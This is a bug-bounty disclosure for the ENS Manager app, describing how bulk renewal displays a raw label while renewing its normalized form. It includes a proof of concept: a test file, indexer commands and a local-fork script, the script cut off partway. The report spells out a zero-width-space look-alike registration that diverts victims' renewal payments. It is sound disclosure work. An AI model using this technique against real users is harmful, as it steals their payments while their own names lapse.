# 90190 w a critical manager bulk renewal displays the raw label but renews the normalized one so a user s rent payment extends a name they do not own

**Submitted on Aug 23rd 2026 at 15:30:14 UTC by @br0nz3p1ck4x3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #90190
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/manager>
* **Impacts:**
  * Causing the application to display or pre-fill an incorrect address, name, or transaction detail, so that a user sends funds or submits a transaction to an unintended recipient, such as: - resolving or rendering an ENS name to an attacker-controlled address - showing the wrong recipient or amount on a transaction the user then approves

## Description

## Summary

The Manager dashboard's bulk renewal resolves one indexer row into two different on-chain names.

Everything the user sees, the dashboard row, the renewal dialog, the per-name breakdown and the success receipt, is `domain.name`, the verbatim label the indexer read off chain. The `label` that becomes the `ETHRegistrar.renew(...)` argument is `domain.normalizedName`, the ENSIP-15 fold of that label.

ENS normalization is many to one and several of the characters it deletes have zero advance width, so the two strings render identically while hashing to different labels. The v2 `ETHRegistrar` takes `label` as a verbatim `string`, so both are real, separately ownable registrations.

`register(string label, address owner, ...)` mints to a caller-supplied owner, so an attacker puts the look-alike into a victim's dashboard in one transaction with no transfer and no victim interaction. `renew` carries no ownership check. When the victim bulk-renews the row, the transaction succeeds, they pay, the name in the row gains nothing, and a name they do not own gains a year.

Because the attacker chooses both labels, they can pick a look-alike whose normalization is a name they already own. Every victim who renews it pays the attacker's rent.

***

## Impact

Measured on a local Sepolia fork against the deployed contracts: the victim paid 8000021 raw USDC units, the token reports 6 decimals, the registration shown in their dashboard row gained 0 seconds, and a registration owned by a third party gained 31536000 seconds.

The victim has no way to detect it before signing. The row, the confirmation dialog and the receipt all print the raw name. The dashboard row's avatar and profile preview are fetched for the normalized name (`apps/manager/src/features/dashboard/components/MyNamesList.tsx:250-253` selects `item.domain.normalizedName ?? item.sortName`, feeding `profileRecordsQuery(name)` at `MyNamesList.tsx:257` and `getNameRowProfilePreview({ label, name, ... })` at `MyNamesList.tsx:111-116`), and so is the dialog's (`apps/manager/src/features/bulk-renew/components/NamesBreakdown.tsx:37`, `apps/manager/src/features/bulk-renew/hooks/useBulkRenew.ts:186-193`). The row therefore shows the attacker's text beside the genuine target's avatar. The price is quoted for the normalized name too (`useBulkRenew.ts:155`), so the amount is internally consistent with the name that actually gets renewed and nothing looks wrong.

The user's own name still lapses. The payment is unrecoverable. The attack costs one ordinary registration per victim, measured at 8000021 raw USDC units for the label used below, and scales to as many addresses as the attacker wants to mint into.

The list is paginated at five rows per page (`apps/manager/src/features/dashboard/components/MyNamesList.tsx:28` `const PAGE_SIZE = 5`, sliced at `MyNamesList.tsx:236-239`), but `NamesTable.tsx:136-152` builds the select-all set from the whole owned-names list rather than the visible page, and `onToggleSelectAll` at `NamesTable.tsx:185-197` adds every entry in it, so one click on "Select all" can pull in rows from pages the user never opened.

The same defect fires with no attacker at all. Any dashboard row whose indexer `name` differs from its `normalizedName`, which the code's own comment anticipates ("the display name may be unnormalized (e.g. mixed case)"), renews a different registration than the one displayed.

***

## Root Cause

Attacker-controlled input: the `label` string the attacker chooses when calling `register(string label, address owner, ...)` on the ETHRegistrar. It is stored verbatim, becomes the `Domain.name` of an indexer row owned by whatever address the attacker names, and is pulled into the victim's dashboard by `apps/manager/src/features/dashboard/useOwnedDomains.ts:36-43` under `where: { owner_in: ownerAddresses }` with no normalization predicate. It reaches the sink through `resolveDomainLabel` at `apps/manager/src/features/dashboard/utils.ts:41-46`.

Sink, `apps/manager/src/features/dashboard/components/NamesTable.tsx:81-93`:

```ts
const toBulkRenewName = (domain: SelectableDomain): BulkRenewName | null => {
  if (!isSelectableDomain(domain)) return null
  const displayName = resolveDomainLabel(domain)
  // Use the canonical normalized name for the on-chain label — the display name
  // may be unnormalized (e.g. mixed case) and would hash to the wrong label.
  const name = domain.normalizedName ?? displayName
  return {
    displayName,
    label: name.replace(/\.eth$/i, ''),
    name,
    currentExpiry: BigInt(domain.expiryDate as number),
  }
}
```

The comment at `:84-85` has the direction backwards. `AbstractETHRegistrar.register` takes `label` as a verbatim `string`, so the raw label is the on-chain name and the normalized one hashes to a different registration.

| What                   | Where                                                                                                                                                                                                                                                        | Value                                                              |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ------------------------------------------------------------------ |
| `resolveDomainLabel`   | `apps/manager/src/features/dashboard/utils.ts:41-46`                                                                                                                                                                                                         | `domain.name ?? domain.normalizedName ?? domain.id`, the raw label |
| dashboard row text     | `mergedNames.ts:129-136` sets `sortName = resolveDomainLabel(domain)`; read as `const label = item.sortName` at `mergedNames.ts:203`; passed `label={label}` at `MyNamesList.tsx:169`; rendered through `NamePill` at `NameRow.tsx:571` to `NameRow.tsx:105` | raw                                                                |
| dialog row text        | `NamesBreakdown.tsx:40` `{row.displayName}`                                                                                                                                                                                                                  | raw                                                                |
| row avatar and profile | `NamesBreakdown.tsx:37` `<NameAvatar name={row.label} preview={row.preview} />`, `useBulkRenew.ts:186-193` `profileRecordsQuery(n.name)`                                                                                                                     | normalized                                                         |
| quoted price           | `useBulkRenew.ts:155` `getRenewPriceQueryOptions(n.label, ...)`                                                                                                                                                                                              | normalized                                                         |
| on-chain label         | `useBulkRenewSubmit.ts:76-84` `submitRenewActor({ label: item.label })` then `registration.actors.ts:1020-1031` `encodeRenewData`                                                                                                                            | normalized                                                         |

`renew(string label, uint64 duration, address paymentToken, bytes32 referrer)` in `@ensdomains/ensjs-abi/v2/ethRegistrar` declares only `DurationTooShort`, `NameNotRenewable`, `PaymentTokenNotSupported` and `SafeERC20FailedOperation`. There is no authorization error: renewal is permissionless, which is why the victim's transaction succeeds instead of reverting.

Nothing re-derives or re-validates the name between selection and submission. There is no ownership check, no availability check and no expiry re-read. `apps/manager` never selects `isNormalized` or `labelName` from the indexer (`packages/indexer/documents/fragments/Domain.graphql`), so the app cannot tell that a row is unnormalized, and no badge or warning marks one. The filter that would exclude such rows exists at `packages/indexer/graphql.gen.ts:155` (`includeUnnormalized`) and the dashboard query never sets it.

Duplicate check run against the ENS known-issues index in the program brief and against my prior submissions in this competition. Result: no match. EXP-INPUT-005 is a validator-acceptance issue whose stated impact is "homograph-style display confusion in our UI rather than incorrect resolution"; this defect needs no deceptive character at all, it fires on any plain mixed-case label, a shape the project's own indexer fixture already models at `apps/manager/src/features/dashboard/v2NameRoles.test.ts:43` (`{ name: 'Alaska.eth', normalizedName: 'alaska.eth' }`), and the impact is a payment landing on a registration the user does not own rather than display confusion. QA-10 is a cosmetic missing-avatar bug in bulk renewal; here the avatar loads correctly, for the wrong name. The `/renew/$name` submission is a different file and the opposite direction: it proves renewability from the normalized name and sends the raw label, so its fix is to send the normalized label, which is exactly what this code already does. My Explorer ownership submission shares the direction but not the root cause: there the two names come from `param` versus `getLabel(param)` inside a route in `apps/portal`, fixed in the Explorer ownership route; here both names arrive on the same indexer row consumed by `apps/manager`, and the split is created by `NamesTable.tsx:86` choosing `domain.normalizedName` over `resolveDomainLabel(domain)` for the calldata. Fixing either prior report leaves `NamesTable.tsx:86` untouched, and fixing this one leaves both of theirs untouched. Three separate one-line fixes in three separate files.

***

## Suggested Fix

Send the label the registration actually has. `domain.name` is the verbatim on-chain label; `domain.normalizedName` is a derived display aid and must never reach calldata.

```ts
// apps/manager/src/features/dashboard/components/NamesTable.tsx
const toBulkRenewName = (domain: SelectableDomain): BulkRenewName | null => {
  if (!isSelectableDomain(domain)) return null
  // The registrar hashes the label string as supplied, so the raw indexer
  // name IS the on-chain name. normalizedName is a different registration.
  const name = domain.name ?? domain.normalizedName
  if (!name) return null
  return {
    displayName: name,
    label: name.replace(/\.eth$/i, ''),
    name,
    currentExpiry: BigInt(domain.expiryDate as number),
  }
}
```

Add the same invariant at the shared sink so no other caller can reintroduce it, in `submitRenewActor` (`packages/transaction-manager/src/machines/registration/registration.actors.ts:1039`) and in `submitRegisterActor`: reject when the displayed name and the transacted `label` disagree, rather than silently preferring one.

Select `isNormalized` in `packages/indexer/documents/fragments/Domain.graphql` and refuse to offer renewal for a row where it is false, or at minimum mark the row in the dashboard and the confirmation dialog. The app currently has no way to see that a row is unnormalized.

## Proof of Concept

## Proof of Concept

Three layers. Layer 1 proves the app displays one name and transacts another, and is standalone. Layer 2 proves the project's own indexer serves such a row under the dashboard's own filter, and Layer 3 proves the on-chain outcome; Layer 2 reads the chain state Layer 3 creates, so the execution order is: start `anvil`, run Layer 3's `fork-poc.sh`, then run Layer 2's commands.

### Layer 1: the app displays one name and transacts another

`apps/manager/src/features/dashboard/bulk-renew-normalization.poc.test.tsx`, in full:

```tsx
/**
 * PoC: the Manager dashboard bulk-renew flow displays `Domain.name` (the raw
 * on-chain label) but sends `Domain.normalizedName` (a DIFFERENT on-chain
 * label) in the `renew` calldata.
 *
 * Every hop below runs the real application code:
 *   NamesTable.toBulkRenewName -> BulkRenewDialog props   (test 1)
 *   useBulkRenewSubmit -> submitRenewActor                (test 2)
 *   submitRenewActor -> encodeRenewData -> renew calldata (test 3)
 */
import { fireEvent, renderHook, screen, waitFor } from '@testing-library/react'
import { act } from 'react'
import { okAsync } from 'neverthrow'
import { labelhash, normalize } from 'viem/ens'
import { decodeFunctionData } from 'viem'
import { ethRegistrarRenewSnippet } from '@ensdomains/ensjs-abi/v2/ethRegistrar'
import { beforeEach, describe, expect, it, vi } from 'vitest'
import { render } from '@/utils/test-utils'

// The attacker's label and the victim-name it normalizes to.
// U+200B ZERO WIDTH SPACE is deleted by ENSIP-15 and has zero advance width in
// every layout context, so the row is pixel-identical to the real name.
const RAW_LABEL = 'vita\u200Blik'
const RAW_NAME = `${RAW_LABEL}.eth`
const NORMALIZED_NAME = 'vitalik.eth'

// The project's own indexer fixture shape, from
// features/dashboard/v2NameRoles.test.ts:43. No exotic characters needed.
const CASE_LABEL = 'Vitalik'
const CASE_NAME = `${CASE_LABEL}.eth`

const EOA = '0x2222222222222222222222222222222222222222' as const

// ---------------------------------------------------------------- test 1 ----

const t1 = vi.hoisted(() => ({
  useOwnedDomains: vi.fn(),
  useDashboardV1Names: vi.fn(),
  dialogProps: undefined as unknown,
}))

vi.mock('@/features/dashboard/useOwnedDomains', () => ({ useOwnedDomains: t1.useOwnedDomains }))
vi.mock('@/features/dashboard/useDashboardV1Names', () => ({
  useDashboardV1Names: t1.useDashboardV1Names,
}))
// Capture what NamesTable hands the renewal dialog, without rendering it.
vi.mock('@/features/bulk-renew', () => ({
  BulkRenewDialog: (props: unknown) => {
    t1.dialogProps = props
    return null
  },
}))
vi.mock('@/utils/backend-client', () => ({
  isBackendAuthed: { get: () => false, subscribe: () => () => {} },
}))
vi.mock('@/features/dashboard/service/queries/getFavorites', () => ({
  favoritesQueryOptions: { queryKey: ['favorites'], queryFn: async () => [] },
}))
vi.mock('@/features/dashboard/service/mutations/addFavorite', () => ({
  addFavoriteMutationOptions: { mutationFn: async () => undefined },
}))
vi.mock('@/features/dashboard/service/mutations/removeFavorite', () => ({
  removeFavoriteMutationOptions: { mutationFn: async () => undefined },
}))
vi.mock('@/lib/smart-account/SmartAccountContext', () => ({
  useSmartAccountContextSafe: () => null,
}))
vi.mock('@/features/migration/hooks/useV1Names', () => ({
  useV1Names: () => ({ data: [], isPending: false, isError: false }),
}))
vi.mock('@/features/migration/hooks/useMigrationEligibility', () => ({
  useMigrationEligibility: () => ({ data: undefined, isPending: false }),
}))
// TanStack Router's <Link> needs a router context; swap it for a plain <a> so
// NameRow itself (the component that renders the visible name) stays REAL.
vi.mock('@tanstack/react-router', async (importOriginal) => ({
  ...(await importOriginal<Record<string, unknown>>()),
  Link: ({ children, ...rest }: { children?: React.ReactNode }) => (
    <a {...(rest as object)}>{children}</a>
  ),
  useRouter: () => ({ isServer: false }),
}))
vi.mock('motion/react', () => ({
  AnimatePresence: ({ children }: { children: React.ReactNode }) => children,
  useReducedMotion: () => true,
  motion: new Proxy(
    {},
    {
      get:
        () =>
        ({ children, ...rest }: { children?: React.ReactNode }) => (
          <div {...(rest as object)}>{children}</div>
        ),
    },
  ),
}))

import { NamesTable } from '@/features/dashboard/components/NamesTable'

// Fixed, far-future expiry so the transcript is byte-stable across runs.
const EXPIRY = 1850000000 // 2028-08-15

/** Exactly the shape the indexer returns, per the project's own fixture at
 *  features/dashboard/v2NameRoles.test.ts:43 (`name: 'Alaska.eth',
 *  normalizedName: 'alaska.eth'`). */
const makeDomain = (name: string) => ({
  id: '0xdeadbeef',
  name,
  normalizedName: NORMALIZED_NAME,
  tokenId: '1',
  createdAt: 1,
  expiryDate: EXPIRY,
  protocol: 'v2',
  isLegacy: false,
  owner: { id: EOA },
  nameRoles: ['owner'],
})

const pushedLookAlike = makeDomain(RAW_NAME)

describe('bulk renew: displayed name vs renewed name', () => {
  beforeEach(() => {
    t1.dialogProps = undefined
    t1.useOwnedDomains.mockReturnValue({
      v2Names: [pushedLookAlike],
      isPending: false,
      isError: false,
    })
    t1.useDashboardV1Names.mockReturnValue({
      v1Names: [],
      isPending: false,
      isError: false,
    })
    t2.useSmartAccountContext.mockReturnValue({
      ownerAddress: EOA,
      accountAddress: EOA,
      walletClient: { account: { address: EOA } },
    })
  })

  it('the two labels are different names on chain', () => {
    for (const raw of [RAW_LABEL, CASE_LABEL]) {
      expect(normalize(`${raw}.eth`)).toBe(NORMALIZED_NAME)
      expect(labelhash(raw)).not.toBe(labelhash('vitalik'))
      console.log(
        JSON.stringify(raw).padEnd(20),
        '-> normalize:',
        JSON.stringify(normalize(`${raw}.eth`)),
        ' labelhash:',
        labelhash(raw),
      )
    }
    console.log('labelhash(vitalik) :', labelhash('vitalik'))
  })

  it('renders the RAW name but hands the NORMALIZED label to the dialog', async () => {
    render(<NamesTable />)

    // 1. what the victim sees in the dashboard row
    const row = await screen.findByText(RAW_NAME)
    console.log('rendered row text:', JSON.stringify(row.textContent))
    expect(row.textContent).toBe(RAW_NAME)

    // 2. select it and open the renewal dialog
    fireEvent.click(screen.getByRole('button', { name: /select all names/i }))
    fireEvent.click(screen.getByRole('button', { name: /renew/i }))

    await waitFor(() => expect(t1.dialogProps).toBeDefined())
    const names = (t1.dialogProps as { names: readonly unknown[] }).names
    console.log(
      'BulkRenewDialog names prop:',
      JSON.stringify(names, (_k, v) => (typeof v === 'bigint' ? `${v}n` : v)),
    )

    // 3. displayed vs transacted
    expect(names).toHaveLength(1)
    const entry = names[0] as { displayName: string; label: string }
    expect(entry.displayName).toBe(RAW_NAME)
    expect(entry.label).toBe('vitalik')
  })

  it('same split for the plain mixed-case label the project already tests for', async () => {
    t1.useOwnedDomains.mockReturnValue({
      v2Names: [makeDomain(CASE_NAME)],
      isPending: false,
      isError: false,
    })
    render(<NamesTable />)

    const row = await screen.findByText(CASE_NAME)
    expect(row.textContent).toBe(CASE_NAME)

    fireEvent.click(screen.getByRole('button', { name: /select all names/i }))
    fireEvent.click(screen.getByRole('button', { name: /renew/i }))

    await waitFor(() => expect(t1.dialogProps).toBeDefined())
    const names = (t1.dialogProps as { names: readonly unknown[] }).names
    const entry = names[0] as { displayName: string; label: string }
    console.log('mixed case  displayName:', entry.displayName, ' label:', entry.label)
    expect(entry.displayName).toBe(CASE_NAME)
    expect(entry.label).toBe('vitalik')
  })
})

// ------------------------------------------------------- tests 2 and 3 ------

const t2 = vi.hoisted(() => ({
  pollTransactionStatusActor: vi.fn(),
  readPaymentTokenAllowanceActor: vi.fn(),
  submitApprovalActor: vi.fn(),
  submitRenewActor: vi.fn(),
  useSmartAccountContext: vi.fn(),
}))

vi.mock(
  '@ens-apps/transaction-manager/machines/registration/registration.actors',
  () => ({
    pollTransactionStatusActor: t2.pollTransactionStatusActor,
    readPaymentTokenAllowanceActor: t2.readPaymentTokenAllowanceActor,
    submitApprovalActor: t2.submitApprovalActor,
    submitRenewActor: t2.submitRenewActor,
  }),
)
vi.mock('@/lib/wagmi', () => ({ publicClient: {} }))
vi.mock('@/utils/router/root-context', () => ({
  getQueryClient: () => ({ invalidateQueries: vi.fn() }),
}))
vi.mock('@/lib/smart-account', () => ({
  useSmartAccountContext: t2.useSmartAccountContext,
}))

import { useBulkRenewSubmit } from '@/features/bulk-renew/hooks/useBulkRenewSubmit'

describe('bulk renew: the label that reaches the chain', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    t2.useSmartAccountContext.mockReturnValue({
      walletClient: { account: { address: EOA } },
    })
    t2.readPaymentTokenAllowanceActor.mockReturnValue(okAsync(10n ** 30n))
    t2.submitRenewActor.mockReturnValue(okAsync('tx-1'))
    t2.pollTransactionStatusActor.mockReturnValue(okAsync({ status: 'ok' }))
  })

  it('submitRenewActor is called with the normalized label', async () => {
    const { result } = renderHook(() => useBulkRenewSubmit())

    await act(async () => {
      await result.current.submit({
        // exactly the RenewItem NamesTable/useBulkRenew produced above
        items: [{ label: 'vitalik', duration: 31536000n }],
        token: 'USDC' as never,
        sumPriceRaw: 0n,
      })
    })

    const call = t2.submitRenewActor.mock.calls[0]?.[0]
    console.log(
      'submitRenewActor input:',
      JSON.stringify(call, (_k, v) => (typeof v === 'bigint' ? `${v}n` : v), 2),
    )
    expect(call.label).toBe('vitalik')
    expect(call.label).not.toBe(RAW_LABEL)
  })

  it('the renew calldata carries the normalized label', () => {
    // Mirrors registration.actors.ts:1020-1031 `encodeRenewData`, using the
    // same ABI the app imports.
    const { encodeFunctionData, zeroHash } = require('viem')
    const data = encodeFunctionData({
      abi: ethRegistrarRenewSnippet,
      functionName: 'renew',
      args: [
        'vitalik',
        31536000n,
        '0x768F42455A2D082E23ceeF7d51e5787C82d67a39',
        zeroHash,
      ],
    })
    const decoded = decodeFunctionData({ abi: ethRegistrarRenewSnippet, data })
    console.log('renew calldata   :', data)
    console.log('decoded label    :', JSON.stringify(decoded.args?.[0]))
    expect(decoded.args?.[0]).toBe('vitalik')
    expect(decoded.args?.[0]).not.toBe(RAW_LABEL)
  })
})
```

Command and full unedited output:

```
$ cd apps/manager && npx vitest run src/features/dashboard/bulk-renew-normalization.poc.test.tsx --disable-console-intercept

 RUN  v4.1.5 /Users/bp/x/ens/2/apps/manager

"vita​lik"           -> normalize: "vitalik.eth"  labelhash: 0xa0ba37e7a749f1d9ba9595a511329bc04765468977f9b7d7fa16423e85d095b3
"Vitalik"            -> normalize: "vitalik.eth"  labelhash: 0x615cb04c18dfb06e81b5b2a6e67288bf2ea924ec7c44b72356dcf9c587d6ec04
labelhash(vitalik) : 0xaf2caa1c2ca1d027f1ac823b529d0a67cd144264b2789fa2ea4d63a67c7103cc
React does not recognize the `whileTap` prop on a DOM element. If you intentionally want it to appear in the DOM as a custom attribute, spell it as lowercase `whiletap` instead. If you accidentally passed it from a parent component, remove it from the DOM element.
rendered row text: "vita​lik.eth"
BulkRenewDialog names prop: [{"displayName":"vita​lik.eth","label":"vitalik","name":"vitalik.eth","currentExpiry":"1850000000n"}]
mixed case  displayName: Vitalik.eth  label: vitalik
submitRenewActor input: {
  "label": "vitalik",
  "duration": "31536000n",
  "selectedToken": "USDC",
  "signer": {
    "type": "eoa",
    "walletClient": {
      "account": {
        "address": "0x2222222222222222222222222222222222222222"
      }
    }
  },
  "publicClient": {}
}
renew calldata   : 0x89d779c300000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000001e13380000000000000000000000000768f42455a2d082e23ceef7d51e5787c82d67a3900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007766974616c696b00000000000000000000000000000000000000000000000000
decoded label    : "vitalik"

 Test Files  1 passed (1)
      Tests  5 passed (5)
   Start at  22:46:56
   Duration  2.39s (transform 365ms, setup 0ms, import 1.50s, tests 758ms, environment 74ms)
```

Note on the transcript above: the three lines showing `"vita​lik"` contain a literal U+200B ZERO WIDTH SPACE, because that is what the program printed. The test source and the shell script both write it as the escape `\u200B` / `chr(0x200B)`, so they survive copy and paste intact. If your viewer strips zero-width characters the output lines will render as `"vitalik"` and appear to contradict themselves; compare the two labelhashes, which differ, rather than the rendered text.

### Layer 2: the indexer serves a row where `name` differs from `normalizedName`

This layer reads the chain state that Layer 3 creates, so run it after Layer 3's script. Order for the whole document: start `anvil`, run `fork-poc.sh` (Layer 3), then run the commands below.

Run the project's own indexer, `ghcr.io/mdtanrikulu/panoptes` from `e2e/infra/docker-compose.yml:139-145`, pinned by digest, against the same fork, pointed at the canonical addresses the PoC registers with and starting at the fork block.

The filter is exactly the dashboard's, `where: { owner_in: [...] }` with `orderBy: name` and `includeUnnormalized` unset, as built at `apps/manager/src/features/dashboard/useOwnedDomains.ts:36-43`. The selection set adds three diagnostic fields the app does not request: the shipped fragment at `packages/indexer/documents/fragments/Domain.graphql` selects `id name normalizedName tokenId resolver owner createdAt expiryDate`, so `isNormalized`, `labelName` and `labelhash` are added here only to show what the app is choosing not to look at. The app also passes `first: 200` and `skip` (`apps/manager/src/features/dashboard/service/queries/getAllDashboardDomains.ts:15,36-43`), omitted here because there are two rows.

```
IMG=ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b

$ cat dq.json
{"query":"query Domains($where: DomainFilter!, $orderBy: Domain_orderBy, $orderDirection: OrderDirection) { domains(where: $where, orderBy: $orderBy, orderDirection: $orderDirection) { id name normalizedName isNormalized labelName labelhash expiryDate owner { id } } }","variables":{"where":{"owner_in":["0xc2aadc32dBac4F7ecf64798EDb5C803443779E47"]},"orderBy":"name","orderDirection":"asc"}}

$ python3 -c "
import json
c = json.load(open('/Users/bp/x/ens/2/e2e/infra/panoptes/contracts.json'))
c['root_registry'] = c['eth_registry'] = c['l2_eth_registry'] = '0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2'
c['l2_eth_registrar'] = '0xa88553F454b77203B0D036A05c894d555EAAa2Cc'
c['l2_deployment_block'] = c['l1_deployment_block'] = 11550567
json.dump(c, open('contracts.poc.json', 'w'), indent=2)
print('wrote contracts.poc.json')
"
wrote contracts.poc.json

$ mkdir -p data4

$ docker run -d --name pano-idx --add-host=host.docker.internal:host-gateway -v "$PWD/data4":/app/data -v "$PWD/contracts.poc.json":/app/config/contracts.json:ro -e DATABASE_PATH=/app/data/ens_v2.db -e RAINBOW_PATH=/app/data/ens_rainbow.db -e DOWNLOAD_RAINBOW=false -e RPC_URL=http://host.docker.internal:8549 -e NETWORK=sepolia -e CONTRACTS_PATH=/app/config/contracts.json -e BATCH_SIZE=10000 -e POLL_INTERVAL=2 -e WEBHOOKS_ENABLED=false ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b /app/ensv2-indexer-v2
f862b42c16b4c18e57515c54d433ed60b8bc6fedba19b47057e16e5f7f2ebe6f

$ sleep 25

$ docker logs pano-idx
Starting: /app/ensv2-indexer-v2
info: SQLite configured for serialized (thread-safe) mode
warning: No .env file found at .env, using defaults
info: ENSv2 Indexer starting...
info: Network: sepolia
info: RPC: [CONFIGURED]
info: V2 Deployment block: 11550567
info: Batch size: 10000
info: Rate limit: 15 req/s
info: Loading schema files from schema/ directory...
info:   Applying schema: 001_initial.sql
info:   Applying schema: 002_bridge_events.sql
info:   Applying schema: 003_eac_roles.sql
info:   Applying schema: 004_ensip16_offchain_metadata.sql
info:   Applying schema: 005_v1_support.sql
info:   Applying schema: 006_v1_controllers.sql
info:   Applying schema: 007_seed_v1_controllers.sql
info:   Applying schema: 008_temporary_registrar.sql
info:   Applying schema: 009_temp_registrar_backfill.sql
info:   Applying schema: 010_unknown_labels.sql
info:   Applying schema: 011_rainbow_labels.sql
info:   Applying schema: 012_registrant.sql
info:   Applying schema: 013_event_indexes.sql
info:   Applying schema: 014_names_namehash_index.sql
info:   Applying schema: 015_registry_namehash_unique.sql
info:   Applying schema: 016_orphaned_registrations.sql
info:   Applying schema: 017_registered_at.sql
info:   Applying schema: 018_resolver_records.sql
info:   Applying schema: 019_eac_roles_contract_address.sql
info:   Applying schema: 020_registry_scoped_constraints.sql
info: Schema loading complete (20 files applied)
info: Database initialized at: /app/data/ens_v2.db
info: Database integrity check passed
info: Fetched current block from chain: 11550579
info: Status server listening on http://0.0.0.0:3001/status
info: Status server enabled on port 3001
warning: Rainbow table not available at /app/data/ens_rainbow.db
info: Rainbow table not available (error.RainbowNotAvailable), label resolution will use [labelhash] format
info: V2 Indexer started - indexing blocks...
info: Single-chain indexer starting for v2...
info: Dropping non-essential indexes for bulk sync...
info: Dropped non-essential indexes for bulk sync performance
info: Indexing v2 from block 11550568 to 11550579 (12 blocks)
info:     Found 2 EACRolesChanged events
info:     Found 2 LabelRegistered events
info:     Found 2 CommitmentMade events
info:     Found 2 ETH NameRegistered events
info:     Found 1 ETH NameRenewed event
info: Progress: 100.0% (12/12 blocks) - Batch 11550568-11550579 indexed
info: Synced v2 to block 11550579
info: Recreating indexes after bulk sync...
info: Index recreation complete (53ms)

$ docker run -d --name pano-api --add-host=host.docker.internal:host-gateway -p 127.0.0.1:5655:5655 -v "$PWD/data4":/app/data -v "$PWD/contracts.poc.json":/app/config/contracts.json:ro -e DATABASE_PATH=/app/data/ens_v2.db -e RAINBOW_PATH=/app/data/ens_rainbow.db -e DOWNLOAD_RAINBOW=false -e NETWORK=sepolia -e CONTRACTS_PATH=/app/config/contracts.json -e RPC_URL=http://host.docker.internal:8549 -e API_PORT=5655 -e WEBHOOKS_ENABLED=false -e METRICS_ENABLED=false ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b /app/ensv2-api
dc567acb8f65512267efd2f68b004ca9abd688617bf2e4d9bc3525ae99253045

$ sleep 10

$ curl -s -X POST http://127.0.0.1:5655/graphql -H 'content-type: application/json' --data @dq.json | python3 -m json.tool
{
    "data": {
        "domains": [
            {
                "id": "poctarget\u200b2608.eth",
                "name": "poctarget\u200b2608.eth",
                "normalizedName": "poctarget2608.eth",
                "isNormalized": false,
                "labelName": "poctarget\u200b2608",
                "labelhash": "0x54226722a01275221ea94df5b06f46ee4dc86e22070fab2a7cdb252f3445f16d",
                "expiryDate": 1819031054,
                "owner": {
                    "id": "0xc2aadc32dbac4f7ecf64798edb5c803443779e47"
                }
            }
        ]
    }
}
```

`name` is the verbatim label, `normalizedName` is its ENSIP-15 fold, they differ, `isNormalized` is false, and the row is returned with `includeUnnormalized` unset.

The indexer's own build corroborates the field contract:

```
$ docker create --name pano-tmp ghcr.io/mdtanrikulu/panoptes@sha256:a5fd2896ddb9e8117ca2d781e09042afea2b56b96a4a52935e79c9c994b24b2b
c06e5471ffbdd12a7698b41080f6a539b45afd387ef4e131013289549154a19c

$ docker export pano-tmp -o fs.tar

$ docker rm -f pano-tmp
pano-tmp

$ tar -xf fs.tar app/ensv2-api app/schema/001_initial.sql

$ sed -n '49,56p' app/schema/001_initial.sql
CREATE TABLE IF NOT EXISTS names (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  chain TEXT NOT NULL,
  name TEXT NOT NULL,
  namehash TEXT NOT NULL,
  label TEXT NOT NULL,
  label_hash TEXT NOT NULL,
  parent_name TEXT NOT NULL,

$ command grep -c normalized_name app/schema/001_initial.sql
0

$ strings -n 6 app/ensv2-api > api.strings

$ command grep -n 'domainNormalizedNameHandler\|domainIsNormalizedHandler\|Ensip15.normalize' api.strings
8163:api.builders.impl.domainNormalizedNameHandler
8165:api.builders.impl.domainIsNormalizedHandler
9744:ensip15.ensip15.Ensip15.normalize
16002:domainNormalizedNameHandler
16004:domainIsNormalizedHandler
20213:api.builders.impl.domainNormalizedNameHandler
20216:api.builders.impl.domainIsNormalizedHandler

$ command grep -n 'FROM names WHERE owner = ?' api.strings
129:FROM names WHERE owner = ? ORDER BY SELECT name, namehash, label, label_hash, parent_name, parent_namehash, owner, resolver, registry, chain,
198:FROM names WHERE owner = ? LIMIT {"type":"","block":,"timestamp":

$ command grep -c includeUnnormalized api.strings
0
```

`names` stores `name` and `label` and has no `normalized_name` column, `normalizedName` and `isNormalized` are per-row field resolvers over a linked ENSIP-15 normalizer, the owner-list SQL carries no normalization predicate, and `includeUnnormalized` is absent from this build entirely.

### Layer 3: on-chain outcome, local Sepolia fork

Start a local fork. Nothing is broadcast to any public network.

```
$ anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com \
        --fork-block-number 11550567 --chain-id 11155111 \
        --port 8549 --host 127.0.0.1

Fork
==================
Endpoint:       https://ethereum-sepolia-rpc.publicnode.com
Block number:   11550567
Block hash:     0x9c2751e0a484da05985a2f8c847175b213ee4f178cf5e55d512e90a5d902a6b3
Chain ID:       11155111
Listening on 127.0.0.1:8549
```

`fork-poc.sh`, in full:

```bash
#!/usr/bin/env bash
# Fork PoC: the label the Manager bulk-renew flow actually sends extends a
# DIFFERENT on-chain registration than the one its dashboard row displays.
#
# Runs entirely against a LOCAL anvil fork of Sepolia. Nothing is broadcast.
#   anvil --fork-url https://ethereum-sepolia-rpc.publicnode.com \
#         --fork-block-number 11550567 --chain-id 11155111 \
#         --port 8549 --host 127.0.0.1
#   ./fork-poc.sh
set -euo pipefail

R=http://127.0.0.1:8549

# Canonical Sepolia ENSv2 deployment (from @ensdomains/ensjs chain config).
REG=0xa88553F454b77203B0D036A05c894d555EAAa2Cc      # ETHRegistrar
REGISTRY=0xBDC85dD5b15D7ecb354cd7cb6f2c50b4f2c4F0E2 # ETHRegistry (PermissionedRegistry)
USDC=0x768F42455A2D082E23ceeF7d51e5787C82d67a39
Z=0x0000000000000000000000000000000000000000
B32=0x0000000000000000000000000000000000000000000000000000000000000000
SECRET=0x7777777777777777777777777777777777777777777777777777777777777777
